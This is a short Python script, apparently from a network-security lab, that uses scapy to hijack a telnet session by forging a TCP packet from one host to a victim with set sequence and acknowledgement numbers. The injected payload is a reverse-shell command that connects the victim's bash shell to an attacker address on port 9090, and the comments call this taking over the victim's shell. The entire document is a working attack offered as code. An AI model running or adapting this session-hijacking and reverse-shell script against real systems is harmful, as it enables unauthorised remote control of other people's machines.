#!/usr/bin/env python3
from scapy.all import *

ip = IP(src = "10.9.0.6", dst = "10.9.0.5") # user impersonation, src = user1 to dst = victim ip address
tcp = TCP(sport = 46492, dport = 23, flags = "A", seq = 585762701, ack = 4007446823) # corresponding s-port and d-port, seq and ack numbers
data = "\n /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \n" # command to takever the victim's shell
pkt = ip/tcp/data
ls(pkt)
send(pkt, iface = "br-7040769befff", verbose = 0)